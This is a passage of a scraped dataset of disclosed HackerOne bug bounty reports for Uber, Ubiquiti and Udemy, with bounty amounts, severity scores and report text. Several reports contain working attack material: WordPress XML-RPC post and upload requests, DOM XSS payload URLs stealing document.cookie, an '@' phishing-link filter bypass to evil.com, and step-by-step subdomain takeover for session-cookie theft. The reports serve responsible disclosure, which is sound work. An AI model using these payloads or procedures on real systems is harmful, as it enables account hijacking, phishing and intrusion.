A new post can be created with the following request. Without supplying a post_status parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.
Code 588 BytesWrap lines Copy Download1<?xml version=""1.0""?>
2<methodCall>
3<methodName>wp.newPost</methodName>
4<params>
5        <param><value>what is this parameter</value></param>
6        <param><value>(INSERT USERNAME)</value></param>
7        <param><value>@@@nopass@@@</value></param>
8        <param><struct>
9                <member><name>post_title</name><value>bugbounty test post</value></member>
10                <member><name>post_content</name><value>any HTML content here</value></member>
11                <member><name>post_excerpt</name><value>excerpt</value></member>
12        </struct></param>
13</params>
14</methodCall>
I've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:

https://love.uber.com/australia/?page_id=6085
https://newsroom.uber.com/us-new-york/?p=2567

A file can be uploaded with a request like this:
Code 600 BytesWrap lines Copy Download1<?xml version=""1.0""?>
2<methodCall>
3<methodName>metaWeblog.newMediaObject</methodName>
4<params>
5        <param><value>what is this parameter</value></param>
6        <param><value>(INSERT USERNAME)</value></param>
7        <param><value>@@@nopass@@@</value></param>
8        <param><struct>
9                <member><name>name</name><value>file_name.html</value></member>
10                <member><name>type</name><value>text/plain</value></member>
11                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
12        </struct></param>
13</params>
14</methodCall>
The ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.
As a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key
I tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via .html or .swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables.",https://hackerone.com/reports/138869,California,United States,San Francisco,2016,5,15,0,3
Ubiquiti Inc.,501-1000,0.0,over-1b,"$1,100.00",High,8.8,Cross-Site Request Forgery (CSRF),Firmware download/install vulnerable to CSRF,jstjohn  submitted a report to Ubiquiti Inc..Mar 9th (5 years ago),https://hackerone.com/reports/323852,New York,United States,New York,2018,3,9,11,17
Ubiquiti Inc.,501-1000,0.0,over-1b,$594.00,Medium,6.1,Command Injection - Generic,Local File Disclosure (+XSS+CSRF) in AirOS 6.2.0 devices,murmus  submitted a report to Ubiquiti Inc..Jul 27th (3 years ago),https://hackerone.com/reports/661647,New York,United States,New York,2019,7,27,4,12
Ubiquiti Inc.,501-1000,0.0,over-1b,"$16,109.00",Critical,9.6,Command Injection - Generic,Privilege Escalation From user to SYSTEM via unauthenticated command execution ,"b0yd  submitted a report to Ubiquiti Inc..Apr 22nd (4 years ago)The vulnerability, or feature depending how you look at it, is the ability to execute commands using the
evostream API interface that is exposed on localhost:7440. Since the evostream service is running as SYSTEM a user can use the launchprocess command,  http://docs.evostream.com/2.0/launchProcess.html, to execute any binary with supplied arguments. The only thing that is keeping this ""feature"" from allowing remote code execution is the fact that it listens on localhost only. However, if it were couple with an SSRF, an attacker could achieve full remote code execution.
Impact
The ability to run arbitrary commands as SYSTEM from any user.2 attachments:F473432: poc.pyF473433: 2019-04-21_17-47-17.mp4",https://hackerone.com/reports/544928,New York,United States,New York,2019,4,22,0,58
Ubiquiti Inc.,501-1000,0.0,over-1b,"$1,604.00",High,7.5,Privilege Escalation,Privilege-0 to Root Privilege Escalation on EdgeSwitch,fr33rh  submitted a report to Ubiquiti Inc..Mar 16th (4 years ago),https://hackerone.com/reports/511025,New York,United States,New York,2019,3,16,16,30
Ubiquiti Inc.,501-1000,0.0,over-1b,"$6,839.00",High,8.8,Command Injection - Generic,RCE in AirOS 6.2.0 Devices with CSRF bypass,murmus  submitted a report to Ubiquiti Inc..Sep 29th (3 years ago),https://hackerone.com/reports/703659,New York,United States,New York,2019,9,29,4,49
Ubiquiti Inc.,501-1000,0.0,over-1b,"$6,690.00",High,8.8,Command Injection - Generic,Readonly to Root Privilege Escalation on EdgeSwitch,fr33rh  submitted a report to Ubiquiti Inc..Feb 14th (3 years ago),https://hackerone.com/reports/796414,New York,United States,New York,2020,2,14,4,28
Ubiquiti Inc.,501-1000,0.0,over-1b,$150.00,Medium,6.1,Cross-site Scripting (XSS) - Reflected,Reflected XSS in Nanostation Loco M2 - AirOS ver=6.1.7,grampae  submitted a report to Ubiquiti Inc..Jul 25th (4 years ago),https://hackerone.com/reports/386570,New York,United States,New York,2018,7,25,5,23
Ubiquiti Inc.,501-1000,0.0,over-1b,"$6,689.00",High,8.8,Information Disclosure,SNMP Community String Disclosure to ReadOnly Users on EdgeSwitch,fr33rh  submitted a report to Ubiquiti Inc..Feb 17th (3 years ago),https://hackerone.com/reports/797988,New York,United States,New York,2020,2,17,10,54
Ubiquiti Inc.,501-1000,0.0,over-1b,$250.00,High,8.4,Path Traversal,UniFi Video Server web interface admin user Firmware Update path traversal leading to local system compromise,ajxchapman  submitted a report to Ubiquiti Inc..Mar 26th (5 years ago),https://hackerone.com/reports/330051,New York,United States,New York,2018,3,26,18,17
Ubiquiti Inc.,501-1000,0.0,over-1b,$667.00,Medium,6.7,Privilege Escalation,UniFi Video v3.10.1 (Windows) Local Privileges Escalation to SYSTEM from arbitrary filedelete and DLL hijack vulnerabilities.,b0yd  submitted a report to Ubiquiti Inc..Apr 8th (4 years ago),https://hackerone.com/reports/530967,New York,United States,New York,2019,4,8,5,1
Ubiquiti Inc.,501-1000,0.0,over-1b,"$1,500.00",High,8.0,Privilege Escalation,UniFi Video web interface Configuration Restore user privilege escalation,ajxchapman  submitted a report to Ubiquiti Inc..Mar 25th (5 years ago),https://hackerone.com/reports/329659,New York,United States,New York,2018,3,25,14,9
Ubiquiti Inc.,501-1000,0.0,over-1b,"$11,689.00",High,8.8,Command Injection - Generic,View Only to Root Privilege Escalation on UniFi Protect,fr33rh  submitted a report to Ubiquiti Inc..Mar 21st (3 years ago),https://hackerone.com/reports/825764,New York,United States,New York,2020,3,21,2,54
Ubiquiti Inc.,501-1000,0.0,over-1b,"$6,690.00",High,8.8,Insufficient Session Expiration,Web Server Predictable Session ID on EdgeSwitch ,fr33rh  submitted a report to Ubiquiti Inc..Jan 14th (3 years ago),https://hackerone.com/reports/774393,New York,United States,New York,2020,1,14,8,23
Ubiquiti Inc.,501-1000,0.0,over-1b,$344.00,Medium,6.1,Cross-site Scripting (XSS) - Reflected,XW 6.2.0 firmware: 5 Reflected XSS issues in link.cgi,nih8l  submitted a report to Ubiquiti Inc..Feb 22nd (3 years ago),https://hackerone.com/reports/802498,New York,United States,New York,2020,2,22,18,9
Ubiquiti Inc.,501-1000,0.0,over-1b,$500.00,High,7.95,Cross-Site Request Forgery (CSRF),Authentication bypass on sso.ubnt.com via subdomain takeover of ping.ubnt.com,"arneswinnen  submitted a report to Ubiquiti Inc..Sep 26th (6 years ago)Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at sso.ubnt.com (via account.ubnt.com). The root cause of this authentication bypass is two-fold:

Subdomain ping.ubnt.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https.
The session cookie of your SSO subdomain sso.ubnt.com is (deliberately?) shared with all https://*.ubnt.com subdomains through its ""domain=.ubnt.com"" attribute. This allows leakage of this high-value session cookie to the overtaken subdomain https://ping.ubnt.com in all modern browsers.

Impact
The following attack scenario was invented: Assume that a victim is logged in in his/her browser to any of the *.ubnt.com services via the SSO system at account.ubnt.com, which uses sso.ubnt.com under the hood. If an attacker can then let the victim make a request to ping.ubnt.com in a second browser tab, either on purpose or unknowingly, the browser will transparently add the session cookie ""UBIC_AUTH"" set by sso.ubnt.com to this subdomain. Since the attacker has full visibility into incoming requests to his/her webserver (in this case, mine), the session cookie is now compromised. Once the attacker's got his/her hands on the session cookie, he/she can now hijack the victim's session on sso.ubnt.com. Since sso.ubnt.com is the centralized place where authentication occurs for all *.ubnt.com services (and perhaps even on other domains via OAuth?), this is a major risk, as an attacker can now impersonate the victim on all their Ubiquity services and connected devices who rely on SSO for authentication. 
In order for this depicted attack to work, the following questions still remain:

Valid SSL Certificate: the ""UBIC_AUTH"" session cookie has the ""secure"" cookie attribute set, which instructs the browser to only send its value over a secured channel. This means that the browser will only send it to https://ping.ubnt.com but not to http://ping.ubnt.com, which now requires the attacker to have a valid SSL certificate for this domain. However, many Certificate Authorities support automated domain verification through hosting a specific HTML file in the root directory of a (sub)domain nowadays (e.g. Lets Encrypt, GoDaddy, ...). Since the subdomain takeover yields the attacker complete control over the webserver serving ping.ubnt.com, this would be trivial. This was not performed as a PoC to not upset you by generating a malicious SSL certificate for your domain and effectively deploying it on a production system, but feel free to give me a heads up if you would like me to actually proceed with this attack scenario. It is literally one command with the certbot utility and free to deploy on AWS Cloudfront. 
Request to ping.ubnt.com: In order for the attacker to convince his/her authenticated victim to make a request to the overtaken subdomain ping.ubnt.com, a number of techniques can be utilized:


Targeted attack: An attacker could simply send his/her victim a mail with an embedded 1x1 image hosted on https://ping.ubnt.com/ inside its HTML. Since email supports HTML by default, this would silently make a request to the overtaken subdomain when being rendered in the victim's browser. Another option would be to lure the victim to an arbitrary attacker-controlled domain which houses a hidden iframe to the overtaken subdomain. Again, the browser would stealthily make the request and leak the ""UBIC_AUTH"" session cookie of sso.ubnt.com to the attacker.
Mass exploitation: An attacker could again host a media resource on https://ping.ubnt.com/ and buy some advertisement space on popular websites to serve it. Every authenticated Ubiquity victim who browses here would leak his/her session cookie to the attacker unknowingly. However, to increase the likelihood that the victims are already authenticated to sso.ubnt.com, an attacker might just post a reply on https://community.ubnt.com with a hidden IMG tag and source https://ping.ubnt.com. Every logged-in reader of the reply would unknowingly make a request to the hijacked subdomain, which would go through IF there was a valid SSL Certificate installed (not currently). Here's the PoC link: https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439 (post of my testuser ""ferrariverdasco"" - see also attached screenshot ""1. Waterhole community reply.png""). 

# 1. Subdomain takeover
The subdomain ""ping.ubnt.com"" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 259 BytesWrap lines Copy Download1# nslookup ping.ubnt.com 8.8.8.8
2Server:		8.8.8.8
3Address:	8.8.8.8#53
4
5Non-authoritative answer:
6ping.ubnt.com	canonical name = dl.ubnt.com.
7dl.ubnt.com	canonical name = d2cnv2pop2xy4v.cloudfront.net.
8Name:	d2cnv2pop2xy4v.cloudfront.net
9Address: 54.192.96.244
However, the hostname ""ping.ubnt.com"" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover (see screenshot ""2. Before takeover.png""). Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, ""ping.ubnt.com"" was designated as hostname successfully (""3. CNAME takeover.png""). This concluded the subdomain takeover (see screenshots ""4. After takeover.png"" and ""5. After takeover - source.png""). PoC URL: http://ping.ubnt.com/34902385023958329058235.html (random filename chosen to not negatively affect Ubiquity's reputation during takeover period). 
# 2. Authentication bypass proof-of-concept
In the PoC below, the assumption is made that https://ping.ubnt.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual risk) - see above.

Open browser & navigate to https://ping.ubnt.com. Accept the invalid SSL certificate for PoC reasons.  Then launch an intercepting proxy tool and configure your browser proxy settings to see traffic going back & forth.
Browse to https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439. Find the request to https://ping.ubnt.com/imagefetch.php?f=thanks.png in the intercepting proxy and view its response (hidden in HTML comments). It should say ""Cookie named 'UBIC_AUTH' is not set!"".
Login to account.ubnt.com in a second browser tab with the victim's account. Notice the ""UBIC_AUTH"" cookie being issued by sso.ubnt.com after successful authentication, with ""domain=.ubnt.com"" attribute.
Refresh first tab https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439. Check in your intercepting proxy that a new request to https://ping.ubnt.com/imagefetch.php?f=thanks.png is made, with a bunch of cookies transparently added by the browser, among which UBIC_AUTH.
The HTML comment body of the response should now show the value of the UBIC_AUTH value, clearly demonstrating that the session cookie's value was well-received. However, this PHP page will make a request to endpoint https://sso.ubnt.com/api/sso/v1/user/self with this cookie and show its response. This should be a JSON array containing victim-account sensitive information, hereby proving that the session cookie can actually be hijacked and used from another system (my webserver in this case). 

In a real attack scenario, an attacker would probably want to store the received cookie locally and use a cookie addon for his/her specific browser, to inject the session cookie value in the browser more persistently, as opposed to in a webserver's PHP curl script. However, I believe this method was more clear for PoC purposes. From here on, an attacker has complete control over a victim's account. He/she can see and modify anything, as long as no extra verification is required (e.g. current password to update to a new password). This is a similar impact of a global XSS & CSRF vulnerability on all *.ubnt.com pages.
You can see all these PoC steps executed in attachment ""6. Authentication Bypass PoC video.mp4"". The code of the https://ping.ubnt.com/imagefetch.php page is also attached (""7. imagefetch.php""). 
Recommendation
The root cause of the vulnerability is the dangling CNAME pointer to Cloudfront from the affected subdomain. It is advised to remove the DNS CNAME pointer from ping.ubnt.com to the Cloudfront CDN server. This will mitigate the root cause vulnerability. If you are interested in keeping the subdomain on the Cloudfront CDN, I'll have to release it first before you can reclaim it. In that case, just let me know.
Additionally, it is advised to investigate whether the session cookie ""UBIC_AUTH"" of sso.ubnt.com should really be shared among all subdomains. This makes subdomain takeovers significantly more impactful, as shown through this report. 
References

https://labs.detectify.com/tag/hostile-subdomain-takeover/

I know this is a very long and complex report for a non-standard issue. Please don't hesitate to contact me if I haven't explained something clearly enough, so I can elaborate. 
Regards,
Arne Swinnen
https://www.arneswinnen.net7 attachments:F123069: 5._After_takeover_-_source.pngF123070: 4._After_takeover.pngF123071: 3._CNAME_takeover.pngF123072: 2._Before_takeover.pngF123073: 1._Waterhole_community_reply.pngF123084: 7._imagefetch.phpF123085: 6._Authentication_Bypass_PoC_video.mp4",https://hackerone.com/reports/172137,New York,United States,New York,2016,9,26,15,18
Ubiquiti Inc.,501-1000,0.0,over-1b,$100.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[nutty.ubnt.com] DOM Based XSS nuttyapp github-btn.html,"bobrov  submitted a report to Ubiquiti Inc..Jan 24th (6 years ago)Description
Vulnerable parameter: user
Vulnerable script: http://nutty.ubnt.com/github-btn.html
Vulnerable code:
Code 512 BytesWrap lines Copy Download1  var params = function () {
2    var vars = [], hash;
3    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
4    for(var i = 0; i < hashes.length; i++) {
5      hash = hashes[i].split('=');
6      vars.push(hash[0]);
7      vars[hash[0]] = hash[1];
8    }
9    return vars;
10  }()
11  var user = params.user,
12      repo = params.repo,
13      type = params.type,
14 ...
15  } else if (type == 'follow') {
16    mainButton.className += ' github-me';
17    text.innerHTML = 'Follow @' + user;
PoCs
PoC #1
HTML Injection for Chrome, Internet Explorer
Code 118 BytesWrap lines Copy Download1http://nutty.ubnt.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow
PoC #2
XSS for Internet Explorer (using X-UA-Compatible IE=9)
Code 259 BytesWrap lines Copy Download1http://bb.blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://nutty.ubnt.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
Image F154666: Screenshot_at_15-59-15.png 38.83 KiBZoom in Zoom out Copy Download
Another vulns
Also, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.
But for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).
Code 321 BytesWrap lines Copy Download1  function jsonp(path) {
2    var el = document.createElement('script');
3    el.src = path + '?callback=callback';
4    head.insertBefore(el, head.firstChild);
5  }
6...
7  if (type == 'follow') {
8    jsonp('https://api.github.com/users/' + user);
9  } else {
10    jsonp('https://api.github.com/repos/' + user + '/' + repo);
11  }
PoC
Code 105 BytesWrap lines Copy Download1http://nutty.ubnt.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork
Result
Code 57 BytesWrap lines Copy Download1https://api.github.com/another/endpoint?callback=callback1 attachment:F154666: Screenshot_at_15-59-15.pngubnt-rubens   changed the status to Triaged. Jan 27th (6 years ago)Ubiquiti Inc.  rewarded bobrov with a $100 bounty. Mar 9th (6 years ago)ubnt-rubens   closed the report and changed the status to Resolved. Mar 9th (6 years ago)bobrov   requested to disclose this report. Mar 9th (6 years ago)ubnt-rubens   agreed to disclose this report. Mar 30th (6 years ago)  This report has been disclosed. Mar 30th (6 years ago)",https://hackerone.com/reports/200753,New York,United States,New York,2017,1,24,12,14
Udemy,1001-5000,0.0,10m-50m,$100.00,Low,2.0,Improper Access Control - Generic,[engineering.udemy.com] - Subdomain Takeover (ghost.io),"kazan71p  submitted a report to Udemy.Jun 18th (4 years ago)Hi Security Team,
Found that DNS record of engineering.udemy.com domain was pointing to inactive ghost.io instance. So when we visit https://engineering.udemy.com we will be notified that site doesn't exist.
Image F310092: Screenshot_at_Jun_18_18-39-58.png 69.57 KiBZoom in Zoom out Copy Download
Code 391 BytesWrap lines Copy Download1$ host engineering.udemy.com
2engineering.udemy.com is an alias for udemy-engineering-blog.ghost.io.
3udemy-engineering-blog.ghost.io has address 141.101.114.35
4udemy-engineering-blog.ghost.io has address 141.101.115.35
5udemy-engineering-blog.ghost.io has address 190.93.244.35
6udemy-engineering-blog.ghost.io has address 190.93.245.35
7udemy-engineering-blog.ghost.io has address 190.93.246.35
So I've registered PRO account for 20$/month on ghost.org and created publication with the name udemy-engineering-blog, as a next step I configured custom DNS record for my publication.
Image F310093: Screenshot_at_Jun_18_18-48-17.png 92.24 KiBZoom in Zoom out Copy Download
CNAME record was already configured, so I could successfully pass validation and even have valid SSL certificate and now can serve content on behalf of engineering.udemy.com
https://engineering.udemy.com/
Image F310094: Screenshot_at_Jun_18_19-03-23.png 45.16 KiBZoom in Zoom out Copy Download
Impact
Attacker is able to serve any content on behalf of engineering.udemy.com domain3 attachments:F310092: Screenshot_at_Jun_18_18-39-58.pngF310093: Screenshot_at_Jun_18_18-48-17.pngF310094: Screenshot_at_Jun_18_19-03-23.pngeric_8n6oy Udemy staff  closed the report and changed the status to Resolved. Jun 18th (4 years ago)Thank you.
The information you provided was accurate and actionable.
Thank you again for taking the time to put together and submitting this report.
    
    
        
            
                
                
                
            
        
    
kazan71p   posted a comment. Jun 20th (4 years ago)Thanks for quick resolution, is it eligible for bounty? acima   updated the severity from high to low. Jun 26th (4 years ago)Udemy  rewarded kazan71p with a $100 bounty. Jun 26th (4 years ago)Thanks for your report.
    
    
        
            
                
                
                
            
        
    
kazan71p   requested to disclose this report. Jun 26th (4 years ago)Thanks for the bounty, can we disclose this report ?acima   agreed to disclose this report. Jun 27th (4 years ago)Thanks again.  This report has been disclosed. Jun 27th (4 years ago)",https://hackerone.com/reports/368119,California,United States,San Francisco,2018,6,18,12,8
Udemy,1001-5000,0.0,10m-50m,$100.00,No value,0.0,Information Disclosure,"Ability to add pishing links in discusion ,"" Bypassing uneductional Links  add ""","zeyadk  submitted a report to Udemy.May 13th (8 years ago){refer to case number 247874}
Hey devs ,
IF you went in course discussion and tried to add for example "" evil.com "" it will get blocked by your system . But if you tried to add
https://support.udemy.com/ it will be added directly
So using a thing i learned in old times th ' @ ' sign after a website url like this site.com@anothersite.com it will actually redirect to to anothersite.com It is because modern browsers interpret this scheme like this ""http://authorization_data@website"", so, when You click on URL, they get You redirected to ""http://website"". so this was the way i bypassed the system adding any pishing link in the end of support.udemy.com link or any whitelisted site :
Example :
https://support.udemy.com@evil.com/
add it in a discussion and a successfull bypass is done and it will be added to discussion flawlessly .
Now ability to pish user into telling them check this support and they will be confident it's a udemy link but you will dircect them to scam site . 
Here is live example :
https://www.udemy.com/course/244336/activities?ids=1415990
So this is it you need not to allow any link with @ in it : Also if you say that the variant after @ will appear as misleading it can be URL encoded ! 
Thanks !",https://hackerone.com/reports/62301,California,United States,San Francisco,2015,5,13,14,44
Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Improper Authentication - Generic,"Able to view others' gifts on /gift/share URL, giftId is predictable, and easy to manipulate","caffeinewriter  submitted a report to Udemy.Feb 27th (7 years ago)I recently purchased a gift for a friend, and noticed the share URL gift ID was simply numeric. I managed to access other people's gifts simply by incrementing and decrementing the ID by 2, I was able to verify that the price was dropped to ""Free"", regardless of if I was logged in or not, and I was able to successfully redeem a gift to an account, even if it was not associated with the gift email, or the account that initially purchased the gift. 
Scope:
This affects Udemy.com at the /gift/share/ endpoint. Reveals name and email of recipient of gift, as well as exposing the gift redemption code.
Example URLs:
https://www.udemy.com/gift/share/?giftId=559076 (mine)
https://www.udemy.com/gift/share/?giftId=559078 (not mine, but still able to access it [giftId incremented by 2])
Replication:

From a valid URL, increment or decrement the giftId parameter by 2.
Visit the course page, and add the couponCode parameter with the coupon code as the value to verify the code is valid, or enter it in the ""Redeem a Coupon"" box. 
Check out, and you will be able to redeem another person's gifts.

Suggested Actions to Rectify Issue:

Require user to be authenticated, and only allow them to view their purchased gifts.
If you want to give unauthenticated access, use randomly generated IDs instead of sequential IDs. 
6 attachments:F75634: chrome_2016-02-26_15-49-18.pngF75635: chrome_2016-02-26_15-51-37.pngF75636: chrome_2016-02-26_15-52-47.pngF75637: chrome_2016-02-26_15-54-07.pngF75647: chrome_2016-02-27_09-29-56.pngF75648: chrome_2016-02-27_09-36-00.png",https://hackerone.com/reports/119166,California,United States,San Francisco,2016,2,27,18,39
Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Improper Authentication - Generic,Authentication Data are not Clearing ,vulnh0lic  submitted a report to Udemy.Feb 28th (7 years ago)Summary by vulnh0licAuthentication Data are not Clearing,https://hackerone.com/reports/119262,California,United States,San Francisco,2016,2,28,11,2
Udemy,1001-5000,0.0,10m-50m,$300.00,High,7.95,Code Injection,Completed Compromise & Source Code Disclosure via Exposed Jenkins Dashboard at https://jenkins101.udemy.com,"cha5m  submitted a report to Udemy.Nov 14th (6 years ago)Howdy, @udemy!
Summary:
I am writing to inform you of a critical information disclosure bug via an exposed Jenkins dashboard located at https://jenkins101.udemy.com. Upon navigating to this address, I was asked to authenticate with my Github account. After authenticating, I was surprised to find that I had complete access to the corresponding Jenkins Dashboard as seen in the screenshot below:
Image F134658: Screenshot_2016-11-14_10.54.39.png 171.21 KiBZoom in Zoom out Copy Download
Impact:
Contained within these files was the complete Udemy Django source code. This included complete database schemas and keys/ credentials for the following services:

Crowdin
Amazon Redshift
Exchange
Facebook
Google
Maxmind
Sendgrid
Sift
Twilio
Zencoder
Level3
Apple
Salesforce
Celery
Paypal
Stripe
Freshdesk
and more

To verify that these credentials were active, I attempted to login into Sendgrid. I was able to take over the Udemy Sendgrid account as seen in the screenshot below. I did not make any change/ access any information.
Image F134656: Screenshot_2016-11-14_10.49.00.png 113.84 KiBZoom in Zoom out Copy Download
Mitigation
Mitigation for this should be fairly straightforward, simply ensuring proper user authentication should prevent future unauthorized users from access the dashboard. I am not storing any of the informaiton that I came across, however, rekeying the compromised systems may not be a bad idea.
I hope this reports helps! Please let me know if you have any questions! 😁
Best,
@n0rb3r72 attachments:F134656: Screenshot_2016-11-14_10.49.00.pngF134658: Screenshot_2016-11-14_10.54.39.pngacima   changed the status to Triaged. Nov 15th (6 years ago)Thanks for your report. I have contacted engineering.acima   posted a comment. Nov 15th (6 years ago)We believe this access has been closed off, can you verify?
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Nov 15th (6 years ago)Hi, @acima! Thank you for the quick triage! It appears that I am no longer able to access the Jenkins dashboard.acima   closed the report and changed the status to Resolved. Nov 17th (6 years ago)Thanks again!acima   updated the severity from critical to high. Nov 17th (6 years ago)
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Nov 17th (6 years ago)Hey @acima! No problem, glad to help. :)
Just curious- if this is just considered ""High"" severity what would you consider to be ""Critical"" severity. I admittedly didn't ""dig in"" too much to respect the privacy of users (as per the brief), but I would think that it can't get much more severe than this.
Cheers!acima   posted a comment. Nov 17th (6 years ago)The HackerOne severity is supposed to be CVSS based, there is a calculator here  https://www.first.org/cvss/calculator/3.0  - happy to hear how you would fill that out.
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Nov 17th (6 years ago)Ah yes, I opted to skip that because I think it's sometimes tough to map these config-based vulnerabilities and I instead just assigned critical as I had all of the creds. For the CIA triad, obviously it's going to be a high for confidentiality, but I could see the argument for integrity and availability as well. Attached is my best shot at it.
That said, I think the CVSS can be somewhat arbitrary and I agree with however you see it. :)
Thanks again!1 attachment:F135279: Screenshot_2016-11-17_18.10.07.png
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Dec 15th (6 years ago)Hi @udemy! Sorry to bother, but is there any update on a bounty for this issue? 
Thanks!Udemy  rewarded cha5m with a $300 bounty. Jan 5th (6 years ago)Sorry for the delay in paying this - thanks again.cha5m   requested to disclose this report. May 18th (6 years ago)  This report has been disclosed. Jun 17th (5 years ago)Summary by cha5mI discovered a critical information disclosure bug via an exposed Jenkins dashboard located at https://jenkins101.udemy.com. Upon navigating to this address, I was presented with a Github authentication page. After authenticating, I was surprised to find that I had complete read access to the corresponding Jenkins Dashboard. 
Contained within the dashboard was the complete Udemy source code, including the keys for various Udemy services.",https://hackerone.com/reports/182104,California,United States,San Francisco,2016,11,14,15,58
Udemy,1001-5000,0.0,10m-50m,$50.00,Low,2.0,Violation of Secure Design Principles,Content Spoofing in udemy,"csanuragjain  submitted a report to Udemy.Sep 28th (6 years ago)Scenerio
An attacker can include any arbitrary text using specially crafted udemy url.
Reporting this but not sure if this is in scope (text injection not marked in exclusion list)
Kindly mark it as informative in case if it is out of scope
Issue seems to be because of source_page=clp param. If this is removed text injection wont work. Also it seems error handling is not proper in case of source_object_id param since this vulnerability occur when you insert a string inside source_object_id param.
Steps
1) Attacker distributed the below url by means of spamming or through his website
https://www.udemy.com/api-2.0/recommended-courses/?source_action=view&source_object=course&source_object_id=},{Kindly%20move%20to%20our%20new%20beta%20website%20evil.com&source_page=clp
2) Victim see below text
{""detail"": ""Invalid source object id: },{Kindly move to our new beta website evil.com""}
3) Since the text came from official site so user believes and gets into attacker trap
Resolution
Crafted text should not be responded back in the response HTML1 attachment:F123681: ContentSpoofing.PNG",https://hackerone.com/reports/172711,California,United States,San Francisco,2016,9,28,18,34
Udemy,1001-5000,0.0,10m-50m,$25.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF in Udemy.com ,c1231665  submitted a report to Udemy.Jan 11th (7 years ago),https://hackerone.com/reports/109839,California,United States,San Francisco,2016,1,11,2,12
Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Violation of Secure Design Principles,Extremely high Course rating values could be set in order to make really high Average rating of the course. Negative values could be set to.,"decay  submitted a report to Udemy.Jul 3rd (7 years ago)Authenticated user can register for some course (paid or free). After registering and taking couple of lectures ""Rate course"" functional becomes active.  
Malicious user can fill the rating form and submit it. By intercepting request to the server's API (by using intercepting proxy tool) and modify rating value he can set enormously large values as rating. After experimenting following restrictions was found:
1) 2147483647   <-- Maximum rating value
2) -2147483648  <-- Minimal rating value
Example of setting such rating could be found on the SCREEN: Set_rating_1.jpg
After some time that rating will affect correct calculation of course's average rating:
PROF SCREEN: Result_of_wrong_rating_2.png
This issue could be used by attacker in order to trick user to buy bad quality content. 
p.s. In order to remove wrong rating value i've already deleted my review. Here is PROF SCREEN:
Delete_rating_3.jpg3 attachments:F43802: Set_rating_1.jpgF43803: Result_of_wrong_rating_2.pngF43805: Delete_rating_3.jpg",https://hackerone.com/reports/73808,California,United States,San Francisco,2015,7,3,20,54
Udemy,1001-5000,0.0,10m-50m,$200.00,High,7.95,None,Jenkins,top  submitted a report to Udemy.Nov 12th (6 years ago)Summary by topOpen Jenkins server. Fixed really quick by Udemy team. Thanks!,https://hackerone.com/reports/181849,California,United States,San Francisco,2016,11,12,23,14
Udemy,1001-5000,0.0,10m-50m,$50.00,No value,0.0,Information Disclosure,information disclosure,"shekhar93  submitted a report to Udemy.Jul 25th (7 years ago)THe below URLs showing the version number of the application :
http://about.udemy.com/readme.html
http://about.udemy.com/wp-content/plugins/all-in-one-seo-pack/readme.txtshekhar93   posted a comment. Jul 31st (7 years ago)any update ?shekhar93   posted a comment. Sep 1st (7 years ago)read it
any one thereudemybugs   changed the status to Triaged. Sep 3rd (7 years ago)Trying to catch up on the backlog of reports! I am sorry for the delay.shekhar93   posted a comment. Sep 3rd (7 years ago)i think it is fixed nowudemybugs   closed the report and changed the status to Resolved. Sep 3rd (7 years ago)Yep! I filed the ticket when I marked this as ""triaged""- so this was a really fast turnaround! Caught me by surprise :)shekhar93   posted a comment. Sep 4th (7 years ago)is this report eligible for bounty? Udemy  rewarded shekhar93 with a $50 bounty. Sep 9th (7 years ago)shekhar93   requested to disclose this report. Jan 8th (7 years ago)  This report has been disclosed. Feb 7th (7 years ago)",https://hackerone.com/reports/78765,California,United States,San Francisco,2015,7,25,21,42
Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Information Disclosure,leak receipt of another user,"adrianbelen  submitted a report to Udemy.May 12th (8 years ago)A attacker can leak receipt information of another user by using the forced browse.
by changing single char here i see another user's receipt
https://www.udemy.com/dashboard/pdf-receipt/?invnum=PD-CC-66574B6C57334B626B366B39
https://www.udemy.com/dashboard/pdf-receipt/?invnum=PD-CC-66574B6C57334B696B366B3D",https://hackerone.com/reports/61371,California,United States,San Francisco,2015,5,12,6,6
